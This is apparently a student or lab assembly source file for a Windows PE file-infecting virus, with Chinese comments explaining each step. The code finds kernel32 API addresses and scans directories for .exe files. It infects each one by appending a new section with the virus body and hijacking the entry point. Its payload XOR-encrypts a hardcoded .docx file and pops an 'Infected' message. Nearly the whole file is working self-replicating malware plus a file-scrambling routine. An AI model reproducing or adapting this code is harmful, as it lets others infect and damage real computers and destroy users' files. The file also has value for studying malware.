.386 
.model flat,stdcall 
option casemap:none 
include windows.inc 
include kernel32.inc 
include user32.inc 
includelib kernel32.lib 
includelib user32.lib 
;这是一些相关的定义， 

.data 
mcaption db "Infected!",0 
mtitle db "Virus",0 
; 主程序所用到的一些变量 


.code 
host_start: 
invoke MessageBox,NULL,offset mcaption,offset mtitle,64 
invoke ExitProcess,0 
;主程序代码，只是简单的打一串字符而已。 
;病毒代码运行完后，就会跳到此处执行。 


Virus SEGMENT PARA USE32 'Virus' 
assume cs:Virus,ds:Virus 
vstart: 
push ebp 
push esp 
call nstart 
nstart:  
;;;;;;;;;;;;; 
pop ebp 
sub ebp,offset nstart 
;病毒中常用的一种方法。得到一个偏移差。 
;程序后面用到的所有变量都需要加上个这偏移差 

assume fs:nothing    ;设置SEH,发生异常可以直接返回原入口. 
lea ebx, SEH[ebp] 
push ebx 
push fs:[0] 
mov fs:[0],esp 
mov OldEsp[ebp],esp 

;========================= 
; * 更改程序入口地址 * 
cmp old_base[ebp],0 
jnz gonext 
mov old_base[ebp],400000h 
gonext: 
cmp old_in[ebp],0 
jnz change 
mov old_in[ebp],1000h 
change: 
mov eax,old_base[ebp] 
mov des_base[ebp],eax 
mov eax, old_in[ebp] 
mov des_in[ebp],eax 
;变量定义的的意思见后方 
;程序开始执行时，当前程序的原入口地址会放到old_base+old_in中 
;由于程序中old_base_in有别的用途，因此将此地址存放到 
;des_base_in，以便最后跳回原程序入口。 

;获得KERNEL32地址及所需的API函数地址 
mov   eax,[esp+10h] ;//取Kernel32返回地址 
and   ax,0f000h 
mov   esi,eax   ;//得到Kernel.PELoader代码位置(不精确) 
LoopFindKernel32: 
    sub   esi,1000h  
    cmp   word ptr[esi],'ZM' ;//搜索EXE文件头 
    jnz   short LoopFindKernel32 
GetPeHeader: 
    movzx edi,word ptr[esi+3ch] 
    add   edi,esi 
    cmp   word ptr[edi],'EP' ;//确认是否PE文件头 
    jnz   short LoopFindKernel32      ;esi->kernel32,edi->kernel32 PE HEADER 
    ;//////////////////////////////////////////////////查找GetProcAddress函数地址 
    mov vKernel32[ebp],esi 

GetPeExportTable: 
    mov   ebx,[edi+78h];4+14h+60h 
    add   ebx,vKernel32[ebp]      ;//得到输出函数表 
    mov   vExportKernel[ebp],ebx 

    push 14 
    call aGetProcAddr 
    db "GetProcAddress",0 
aGetProcAddr:  
    lea  eax,GetApiAddress[ebp] 
    call eax 
    or eax,eax 
    jz ExitTimes 
    mov  vGetProcAddress[ebp],eax ;得到GetProcAddress地址 

    lea esi,bGetModuleHandle[ebp]  ;获得所有用到的KERNEL32函数的地址 
    lea edi,vGetModuleHandle[ebp] 
    cld 
ComeOn:   
    lodsd 
    add eax,ebp 
    push eax 
    push vKernel32[ebp] 
    call dword ptr vGetProcAddress[ebp] 
    or eax,eax 
    jz ExitTimes 
    stosd 
    cmp dword ptr[esi],0 
    jnz ComeOn 

    call UserDll1 
    db "User32.dll",0 
UserDll1: 
    call dword ptr vGetModuleHandle[ebp] 
    or eax,eax 
    jnz Right 
    call  UserDll2 
    db "User32.dll",0 
UserDll2: 
    call dword ptr vLoadLibrary[ebp] 
    or eax,eax 
    jz ExitTimes   ;获得USER32.DLL地址 
Right: 
    call GetMess 
    db "MessageBoxA",0 
GetMess: 
    push eax 
    call dword ptr vGetProcAddress[ebp] 
    or eax,eax 
    jz ExitTimes 
    mov vMessageBox[ebp],eax ;获得MESSAGEBOX地址 

    ;------------------------- 
    ;目录的开头部份 
    lea eax,NowPath[ebp] 
    push eax 
    mov eax,256 
    push eax 
    call vGetCurrentDirectory[ebp] ;成功返回写入字节数,失败返回0 
    test eax,eax 
    jz ExitTimes 
    ;通过API函数得到当前程序所在目录 


    lea eax,NowPath[ebp] 
    push eax 
    lea eax,SrcDir[ebp] 
    push eax 
    call vlstrcpy[ebp] 
    test eax,eax 
    jz ExitTimes 
    ;保存当前目录 


    mov NowPathNo[ebp],1 
FindStartT: 
    cmp NowPathNo[ebp],1 
    jz GFindFt 
    cmp NowPathNo[ebp],2 
    jz GetWinD 
    cmp NowPathNo[ebp],3 
    jz GetSysD 
    jmp AllFindEnd  
    ;根据NowPathNor值来判断感染哪个目录的文件 


GetWinD:  

    mov eax,256 
    push eax 
    lea eax,NowPath[ebp] 
    push eax 
    call vGetWindowsDirectory[ebp] 
    test eax,eax 
    jz ExitTimes 

    lea eax,NowPath[ebp] 
    push eax 
    call vSetCurrentDirectory[ebp] 
    test eax,eax 
    jz ExitTimes 
    jmp GFindFt 
    ;得到WINDOWS所在目录，并且将其设为当前目录 


GetSysD: 
    mov eax,256 
    push eax 
    lea eax,NowPath[ebp] 
    push eax 
    call vGetSystemDirectory[ebp] 
    test eax,eax 
    jz ExitTimes 

    lea eax,NowPath[ebp] 
    push eax 
    call vSetCurrentDirectory[ebp] 
    test eax,eax 
    jz ExitTimes 
    ;得到SYSTEM所在目录，并且将其设为当前目录 


GFindFt: 
    lea eax,FindData[ebp] 
    push eax 
    lea eax,FileFilter[ebp] 
    push eax 
    call vFindFirstFile[ebp] 
    cmp eax,INVALID_HANDLE_VALUE 
    jz FindEnds 
    mov hFind[ebp],eax 
    ;查找当前目录下的第一个EXE文件 

GoOnFind: 
    ;获得文件的属性,确保文件可以被打开 
    lea eax,FindData[ebp].cFileName 
    push eax 
    call  vGetFileAttributes[ebp] 
    cmp eax,-1 
    jz EndDir 
    mov OldAttribute[ebp],eax 
    test eax,1 
    jz Open 
    and eax,0fffffffeh 
    push eax 
    lea eax,FindData[ebp].cFileName 
    push eax 
    call vSetFileAttributes[ebp] 
    cmp eax,-1 
    jz EndDir 
Open:  
    ;以下是病毒传染部份 
    ;------------------------- 
    push 0 
    push FILE_ATTRIBUTE_NORMAL 
    push OPEN_EXISTING 
    push 0 
    push FILE_SHARE_READ+FILE_SHARE_WRITE 
    push GENERIC_READ+GENERIC_WRITE 
    lea eax,FindData[ebp].cFileName 
    push eax 
    call vCreateFile[ebp] 
    cmp eax,INVALID_HANDLE_VALUE 
    jz EndDir 
    mov hFile[ebp],eax 
    ;打开文件 

    lea eax, LastWriteTime[ebp] 
    push eax 
    lea eax, LastAccessTime[ebp] 
    push eax 
    lea eax, CreationTime[ebp] 
    push eax 
    push hFile[ebp] 
    call vGetFileTime[ebp] 
    test eax,eax 
    jz CloseFile1 
    ;保存原来文件修改时间 

    push 0  
    push 0  
    push 0  
    push PAGE_READWRITE  
    push NULL  
    push hFile[ebp]  
    call vCreateFileMapping[ebp]  
    or eax,eax 
    jz Closefile 
    mov hMapping[ebp], eax  

    push 0  
    push 0  
    push 0  
    push FILE_MAP_READ+FILE_MAP_WRITE  
    push hMapping[ebp]  
    call vMapViewOfFile[ebp] 
    or eax,eax 
    jz CloseMap 
    mov pMapping[ebp], eax 
    ;判断感染条件:1,是否PE.2:是否已感染.3:是否有足够的空间.4:WINZIP自解压文件 
    mov ebx, eax  
    assume ebx :ptr IMAGE_DOS_HEADER  
    mov eax,[ebx].e_lfanew 
    test eax,0fffff000h 
    jnz  EndDir  ;Header+stub不可能太大,超过4096byte  
    mov pe_header_off[ebp],eax 
    add ebx,eax ;此时ebx指向PE文件头 
    assume ebx:ptr IMAGE_NT_HEADERS  
    cmp [ebx].Signature,IMAGE_NT_SIGNATURE ;是PE文件吗？ 
    jnz UnMap   
    cmp word ptr[ebx+1ah],'FB' ;是否已经感染  
    jz UnMap 
    ;***************************************************************  
    ;指向第二个节判断是否是WinZip自解压文件 
    ;是就不感染 
    ;*************************************************************** 
    mov eax,ebx 
    add eax,18h                ;PE HEADER(4)+FILEHEADER(14) 
    movzx esi,[ebx].FileHeader.SizeOfOptionalHeader  
    add eax,esi ;eax指向第1个节表 
    assume eax:ptr IMAGE_SECTION_HEADER 
    mov edx,[eax].PointerToRawData 
    add edx,ebx 
    sub edx,pe_header_off[ebp] 
    sub edx,4 
    cmp dword ptr[edx],0 
    jnz UnMap 
    add eax,28h ;eax指向第2个节表 
    mov edx,eax 
    assume edx:ptr IMAGE_SECTION_HEADER 
    mov eax,[edx].PointerToRawData 
    add eax,ebx 
    sub eax,pe_header_off[ebp] 
    add eax,12h ;加10h+2h(10h处为"WinZip....") 
    cmp dword ptr [eax], 'piZn' 
    jz UnMap 
    push [ebx].OptionalHeader.FileAlignment 
    pop FileAlign[ebp] 
    ;***************************************************************  
    ;判断是否有足够空间存储新节  
    ;28h=sizeof IMAGE_SECTION_HEADER ,18h=sizeof IMAGE_FILE_HEADER 
    ;edi将指向新节  
    ;***************************************************************  
    movzx eax,[ebx].FileHeader.NumberOfSections ;文件的节数 
    mov ecx,28h 
    mul ecx       
    add eax,pe_header_off[ebp] 
    add eax,18h  
    movzx esi,[ebx].FileHeader.SizeOfOptionalHeader  
    add eax,esi 
    mov NewSection_off[ebp],eax ;保存新节起始RVA 
    add eax,28h    ;比较增加新节后是否超出SizeOfHeaders(节.TEXT在文件中的RVA) 
    cmp eax,[ebx].OptionalHeader.SizeOfHeaders  
    ja  Infest   ;即使没有添加空间还是可以免疫 

    push pMapping[ebp]          ;关闭映射文件,然后从新生成新的映射文件 
    call vUnMapViewOfFile[ebp]  ;并将映射文件的空间增加4K以便加入病毒代码 
    push hMapping[ebp]  
    call vCloseHandle[ebp]       

    push 0 
    push hFile[ebp] 
    call vGetFileSize[ebp]  ;get file size 
    cmp eax,INVALID_HANDLE_VALUE 
    jz Closefile 
    mov ecx,FileAlign[ebp] 
    xor edx,edx 
    div ecx 
    test edx,edx 
    jz NoChange 
    inc eax  
NoChange: 
    mul ecx  
    mov fsize[ebp],eax;文件尺寸节文件对齐 
    add eax,1000h   

    push 0  
    push eax  
    push 0  
    push PAGE_READWRITE  
    push NULL  
    push hFile[ebp]  
    call vCreateFileMapping[ebp]  
    or eax,eax 
    jz Closefile 
    mov hMapping[ebp], eax  

    push 0  
    push 0  
    push 0  
    push FILE_MAP_READ+FILE_MAP_WRITE  
    push hMapping[ebp]  
    call vMapViewOfFile[ebp] 
    or eax,eax 
    jz CloseMap 
    mov pMapping[ebp], eax 

    mov ebx,eax 
    add ebx,pe_header_off[ebp] ;此时ebx指向PE文件头 
    assume ebx:ptr IMAGE_NT_HEADERS 

    Noinfect: ;保存原入口  
    mov eax,[ebx]. OptionalHeader.AddressOfEntryPoint  
    mov old_in[ebp],eax  
    mov eax, [ebx].OptionalHeader.ImageBase  
    mov old_base[ebp],eax  

    mov edi,NewSection_off[ebp]    ;新节的RVA 
    add edi,pMapping[ebp] ;edi->新节起始地址 
    ;********************************************************************* 
    ;空间允许, ^0^,开始插入新节并填充各字段  
    ;esi指向原文件最后一个节，利用它来填充新节某些字段 
    ;*********************************************************************  
    inc [ebx].FileHeader.NumberOfSections ;节数目+1 
    mov esi,edi  ;edi指向新节 
    sub esi,28h  ;esi指向上一个节 
    assume edi:ptr IMAGE_SECTION_HEADER  
    assume esi:ptr IMAGE_SECTION_HEADER  
    mov [edi].Name1,41h ;随便为新节命名，使之不等于0 
    push [ebx].OptionalHeader.SizeOfImage ;原文件映像装入内存后的总尺寸,对齐SectionAlignment. 
    pop [edi].VirtualAddress   ;新节在内存中的地址 
    mov eax,offset vend-offset vstart 
    mov [edi].Misc.VirtualSize,eax ;新节的大小(未对齐) 
    mov ecx,[ebx].OptionalHeader.FileAlignment 
    xor edx,edx 
    div ecx 
    test edx,edx 
    jz NoChange1 
    inc eax  
NoChange1: 
    mul ecx 
    mov [edi].SizeOfRawData,eax ;新节对齐FileAligment后的大小 
    mov eax,fsize[ebp] 
    mov [edi].PointerToRawData,eax ;本节在文件中的位置 
    mov [edi].Characteristics,0E0000020h ;可读可写可执行  

    ;*****************************************************************************************  
    ;更新SizeOfImage,AddressOfEntryPoint,使新节可以正确加载并首先执行  
    ;***************************************************************************************** 
    mov eax,[edi].Misc.VirtualSize ;新节的大小(未对齐) 
    mov ecx,[ebx].OptionalHeader.SectionAlignment ;内存节对齐 
    xor edx,edx 
    div ecx 
    test edx,edx 
    jz NoChange2 
    inc eax  
NoChange2: 
    mul ecx  
    add eax,[ebx].OptionalHeader.SizeOfImage;对齐后大小+原文件映像装入内存后的总尺寸,对齐SectionAlignment. 
    mov [ebx].OptionalHeader.SizeOfImage,eax ;更新后的文件映像装入内存后的总尺寸,对齐SectionAlignment. 
    mov eax,[edi].VirtualAddress ;新节在内存中的地址写入入口点 
    mov [ebx].OptionalHeader.AddressOfEntryPoint,eax  
    mov word ptr [ebx+1ah],'FB' ;写入感染标志  

    mov edi,pMapping[ebp] 
    add edi,fsize[ebp] 
    lea esi,vstart[ebp] 
    mov ecx,offset vend-offset vstart 
    cld 
    rep movsb            ;将病毒代码写入映射的内存中(在原文件之后) 

    ; ;************************************************* 
    ; ;乾坤大挪移，将节表移到PE头的最后 
    ; ;************************************************* 
    ; mov edi,[ebx].OptionalHeader.SizeOfHeaders 
    ; add edi,ebx  
    ; sub edi,pe_header_off[ebp];edi->文件中的第一个节 
    ; dec edi  ;edi->PE头的最后一个字节 

    ; mov esi,ebx 
    ; add esi,18h                ;PE HEADER(4)+FILEHEADER(14) 
    ; movzx eax,[ebx].FileHeader.SizeOfOptionalHeader  
    ; add esi,eax ;esi指向第1个节表 
    ; movzx ecx,[ebx].FileHeader.NumberOfSections 
    ; imul ecx,ecx,28h 
    ; add esi,ecx 
    ; dec esi ;esi->最后一个节的最后一个字节 
    ; std 
    ; rep movsb ;乾坤大挪移 
    ; sub edi,ebx  
    ; sub edi,18h 
    ; inc edi 
    ; mov word ptr[ebx].FileHeader.SizeOfOptionalHeader,di;更新可选头大小 

;*************************************************************************** 
;退出前进行节空间填塞免疫，edi->First Section Table,ecx=NumberOfSections 
;*************************************************************************** 
Infest: 
    mov edi,ebx 
    add edi,18h                ;PE HEADER(4)+FILEHEADER(14) 
    movzx esi,[ebx].FileHeader.SizeOfOptionalHeader  
    add edi,esi ;edi指向第1个节表 
    movzx ecx,[ebx].FileHeader.NumberOfSections 
SectionInfest: 
    assume edi:ptr IMAGE_SECTION_HEADER 
    mov eax,[edi].SizeOfRawData;文件对齐后节的大小 
    cmp eax,[edi].Misc.VirtualSize ;节的大小(未对齐) 
    jb NextSection 
    mov [edi].Misc.VirtualSize,eax 
NextSection: 
    add edi,28h 
    loop SectionInfest 

UnMap: 
    push pMapping[ebp]  
    call vUnMapViewOfFile[ebp] 
CloseMap: 
    push hMapping[ebp]  
    call vCloseHandle [ebp] 

Closefile: 
    lea eax, LastWriteTime[ebp] 
    push eax 
    lea eax, LastAccessTime[ebp] 
    push eax 
    lea eax, CreationTime[ebp] 
    push eax 
    push hFile[ebp] 
    call vSetFileTime[ebp] 
CloseFile1: 
    push hFile[ebp]  
    call vCloseHandle [ebp] 

    mov eax,OldAttribute[ebp] 
    test eax,1 ;是否需要恢复文件属性(有写属性就不需要恢复了) 
    jz EndDir 
    push eax 
    lea eax,FindData[ebp].cFileName 
    push eax 
    call vSetFileAttributes[ebp]  ;恢复原来文件属性 
    ;-------------------------------- 
;目录结尾区  
EndDir: 
    lea eax,FindData[ebp] 
    push eax 
    push hFind[ebp] 
    call vFindNextFile[ebp] 
    cmp eax,0 
    jnz GoOnFind  
    ;查找下一个文件，然后继续感染，直到全感染全为止 

FindEnds: 
    push hFind[ebp] 
    call vFindClose[ebp] 
    mov  NowPathNo[ebp],4 
    ;inc NowPathNo[ebp] 
    ;inc NowPathNo[ebp] ;<< 多加了几个1 
    ;inc NowPathNo[ebp] ;<< 
    ;inc NowPathNo[ebp] ;<< 
    jmp FindStartT 
    ;为了调试方便，在此只感染当前目录 


AllFindEnd: 
    lea eax,SrcDir[ebp] 
    push eax 
    call vSetCurrentDirectory[ebp] 
;恢复当前目录 


;####[ 病毒发作区 ]########################;  
;--- 发作代码 ------------------- 
InTimes: 
;--------------------------------
    push 0 
    push FILE_ATTRIBUTE_NORMAL 
    push OPEN_EXISTING 
    push 0 
    push FILE_SHARE_READ+FILE_SHARE_WRITE 
    push GENERIC_READ+GENERIC_WRITE 
    lea eax, DocxFile[ebp]
    push eax 
    call vCreateFile[ebp] 
    cmp eax,INVALID_HANDLE_VALUE 
    jz ExitTimes 
    mov hFile[ebp],eax 
    ;打开文件 

    push 0  
    push 0  
    push 0  
    push PAGE_READWRITE  
    push NULL  
    push hFile[ebp]  
    call vCreateFileMapping[ebp]  
    or eax,eax 
    jz CloseDocxFile
    mov hMapping[ebp], eax  

    push 0  
    push 0  
    push 0  
    push FILE_MAP_READ+FILE_MAP_WRITE  
    push hMapping[ebp]  
    call vMapViewOfFile[ebp] 
    or eax,eax 
    jz CloseDocxFileMap
    mov pMapping[ebp], eax

    push 0 
    push hFile[ebp] 
    call vGetFileSize[ebp]  ;get file size 
    cmp eax,INVALID_HANDLE_VALUE 
    jz CloseDocxFile
    mov ecx, eax
    mov ebx, pMapping[ebp]

EncFile:
    xor byte ptr [ebx], 89
    inc ebx
    loop EncFile

    push 0 
    lea eax,MyTitle[ebp] 
    push eax 
    lea eax,MyTalk[ebp] 
    push eax 
    push 0 
    call vMessageBox[ebp]
    ; 显示一个提示窗口
    push pMapping[ebp]  
    call vUnMapViewOfFile[ebp]
    jmp  CloseDocxFileMap

CloseDocxFile:
    push hFile[ebp]  
    call vCloseHandle [ebp] 

CloseDocxFileMap:
    push hMapping[ebp]  
    call vCloseHandle [ebp] 

ExitTimes: 

    ;###########################################; 
    ; 恢复寄存器，跳回原程序处  
    ;------------------------------------------ 
    pop fs:[0] 
    add esp,4 
    mov eax,des_base[ebp] 
    add eax,des_in[ebp] 
    pop esp 
    pop ebp 
    push eax 
    ret 
    ;-------< 做好返回原程序的准备 >----------- 
    ;;;;;;;;;;;;;; 

;返回主程序 
    GetApiAddress proc AddressOfName:dword,ApiLength:byte 
    push ebx 
    push esi 
    push edi 
    call Tmp 
Tmp: 
    pop  edx 
    sub edx,offset Tmp 
    mov  edi,vExportKernel[edx]   
assume edi:ptr IMAGE_EXPORT_DIRECTORY  
GetExportNameList:   
    mov   ebx,[edi].AddressOfNames ;//得到输出函数名表 
    add   ebx,vKernel32[edx]     ;ebx->AddressOfNames(函数名字的指针地址). 
    xor   eax,eax      ;//函数序号计数 
    mov   edx,vKernel32[edx]      ;//暂存Kernel32模块句柄;edx->kernel32 
    push edi   ;保存EDI 

LoopFindApiStr: 
    add   ebx,04        
    inc   eax          ;//增加函数计数 
    mov   edi,dword ptr[ebx] 
    add   edi,edx      ;//得到一个Api函数名字符串.edi->函数名 
    StrGetProcAddress:   
    mov esi,AddressOfName       ;//得到Api名字字符串 
    cmpsd;比较前4个字符是否相等   
    jnz   short LoopFindApiStr  ;eax=函数名的INDEX    
    xor   ecx,ecx 
    mov   cl, ApiLength 
    sub   cl,4        ;//比较剩余的GetProcAddress串 
    cld 
Goon: 
    cmpsb 
    jnz   short LoopFindApiStr  ;eax=函数名的INDEX 
    loop Goon 

    pop edi ;恢复EDI 
    mov   esi,edx  
    mov ebx,[edi].AddressOfNameOrdinals 
    add ebx,esi     ;//取函数序号地址列表,ebx->AddresssOfNameOrdinals 
    movzx ecx,word ptr [ebx+eax*2] 
    mov   ebx,[edi].AddressOfFunctions 
    add   ebx,esi      ;//得到Kernel32函数地址列表 
    mov   ebx,dword ptr[ebx+ecx*4] 
    add   ebx,esi      ;//计算GetProcAddress函数地址  
    mov   eax,ebx      ;eax=API函数地址,esi=Kernel32.dll hModule 
    pop edi 
    pop esi 
    pop ebx 
    ret 
GetApiAddress endp  

SEH PROC C pExcept:DWORD,pFrame:DWORD,pContext:DWORD,pDispatch:DWORD 
    call Next 
Next: 
    pop ebx 
    sub ebx,offset Next 
    assume  edi:ptr CONTEXT 
    assume  esi:ptr EXCEPTION_RECORD 
    mov     esi,pExcept 
    mov     edi,pContext           
    test    dword ptr[esi+4],1              ;Exception flags 
    jnz     @f         
    test    dword ptr[esi+4],6 
    jnz     @f 

    mov     eax,OldEsp[ebx] 
    mov     [edi].regEsp,eax                 ;恢复ESP               
    lea     eax,ExitTimes[ebx] 
    mov     [edi].regEip,eax                 ; 
    mov     eax,0 

    ret  
@@: 
    mov eax,1 
    ret 
SEH ENDP 
    ;-------------------------- 
    ; 函数调用地址 
    ;-------------------------- 
    vKernel32 dd 0 
    vExportKernel dd 0 
    vGetProcAddress dd 0 

    vGetModuleHandle dd 0 
    vLoadLibrary dd 0 
    vCreateFile dd 0  
    vGetFileSize dd 0 
    vCreateFileMapping dd 0  
    vMapViewOfFile dd 0  
    vUnMapViewOfFile dd 0  
    vCloseHandle dd 0 
    vGetCurrentDirectory dd 0  
    vGetWindowsDirectory dd 0  
    vGetSystemDirectory dd 0  
    vSetCurrentDirectory dd 0 
    vlstrcpy dd 0 
    vFindFirstFile dd 0  
    vFindNextFile dd 0  
    vFindClose dd 0  
    vGetSystemTime dd 0  
    vExitProcess dd 0 
    vGetFileAttributes dd 0 
    vSetFileAttributes dd 0 
    vGetFileTime dd 0 
    vSetFileTime dd 0 

    vMessageBox dd 0 

    bGetModuleHandle dd offset sGetModuleHandle 
    bLoadLibrary dd offset sLoadLibrary 
    bCreateFile dd offset  sCreateFile 
    bGetFileSize dd offset sGetFileSize 
    bCreateFileMapping dd offset sCreateFileMapping  
    bMapViewOfFile dd offset sMapViewOfFile  
    bUnMapViewOfFile dd offset sUnMapViewOfFile  
    bCloseHandle dd offset sCloseHandle 
    bGetCurrentDirectory dd offset sGetCurrentDirectory   
    bGetWindowsDirectory dd offset sGetWindowsDirectory   
    bGetSystemDirectory dd offset sGetSystemDirectory  
    bSetCurrentDirectory dd offset sSetCurrentDirectory 
    blstrcpy dd offset slstrcpy  
    bFindFirstFile dd offset  sFindFirstFile 
    bFindNextFile dd offset sFindNextFile  
    bFindClose dd offset sFindClose  
    bGetSystemTime dd offset sGetSystemTime 
    bExitProcess dd offset sExitProcess 
    bGetFileAttributes dd offset sGetFileAttributes 
    bSetFileAttributes dd offset sSetFileAttributes 
    bGetFileTime dd offset sGetFileTime 
    bSetFileTime dd offset sSetFileTime 
    dd 0 

    sGetModuleHandle db "GetModuleHandleA",0 
    sLoadLibrary db "LoadLibraryA",0 
    sCreateFile db  "CreateFileA",0 
    sGetFileSize db "GetFileSize",0 
    sCreateFileMapping db "CreateFileMappingA",0  
    sMapViewOfFile db  "MapViewOfFile",0 
    sUnMapViewOfFile db "UnmapViewOfFile",0  
    sCloseHandle db "CloseHandle",0 
    sGetCurrentDirectory db "GetCurrentDirectoryA",0   
    sGetWindowsDirectory db "GetWindowsDirectoryA",0   
    sGetSystemDirectory db "GetSystemDirectoryA",0  
    sSetCurrentDirectory db "SetCurrentDirectoryA",0 
    slstrcpy db "lstrcpy",0  
    sFindFirstFile db "FindFirstFileA",0 
    sFindNextFile db "FindNextFileA",0  
    sFindClose db "FindClose",0  
    sGetSystemTime db "GetSystemTime",0 
    sExitProcess db "ExitProcess",0 
    sGetFileAttributes db "GetFileAttributesA",0 
    sSetFileAttributes db "SetFileAttributesA",0 
    sGetFileTime db "GetFileTime",0 
    sSetFileTime db "SetFileTime",0 
    ; 其它的略....需要用到API函数地址 

    ALIGN 4 
    OldEsp dd 0 
    DocxFile db "C:\Users\CQU\Desktop\test.docx",0
    MyTitle db "Virus",0 
    MyTalk db "Pe Infected!",0 

    hFile dd 0 
    fsize dd 0 
    FileAlign dd 0 
    OldAttribute dd 0 
    hMapping dd 0 
    pMapping dd 0 
    pe_header_off dd 0 ;存储PE文件头相对文件的偏移量 
    NewSection_off dd 0 ;存储新节相对文件的偏移量 
    old_base dd 0 
    old_in dd 0 
    des_base dd 0 
    des_in dd 0 
    CreationTime FILETIME <>   ;存储文件时间 
    LastAccessTime FILETIME <> 
    LastWriteTime FILETIME<> 

    ;相关的变量定义 


    ;----------------------------- 
    ; 查找文件专用 

    FileFilter db "*.exe",0 
    FindData WIN32_FIND_DATA <> 
    hFind dd 0 
    NowPath db 256 dup (0) 
    NowPathNo db 0 
    SrcDir db 256 dup (0) 
    ;----------------------------- 
    NowTimes SYSTEMTIME <> 
    ;----------------------------- 

vend: 
Virus ends 

    end vstart 
